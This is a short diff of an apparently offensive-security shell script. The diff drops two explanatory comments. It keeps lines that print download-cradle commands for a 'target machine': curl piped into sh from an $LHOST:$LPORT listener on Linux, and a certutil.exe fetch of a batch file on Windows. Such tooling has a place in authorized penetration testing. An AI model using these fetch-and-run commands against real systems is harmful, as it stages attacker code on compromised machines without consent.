@@ -98,13 +98,11 @@ done
 
 if [ $ARCH == "linux" ]; then
     echo ""
-    echo "Use 'curl' piped into 'sh' to download all scripts to your target machine"
     echo "curl http://$LHOST:$LPORT/download.sh | sh"
     echo ""
 fi
 if [ $ARCH == "windows" ]; then
     echo ""
-    echo "Use 'certutil.exe' to download bash script to your target machine, then run it."
     echo "certutil.exe -urlcache -split -f http://$LHOST:$LPORT/download.bat download.bat"
     echo ""
 fi
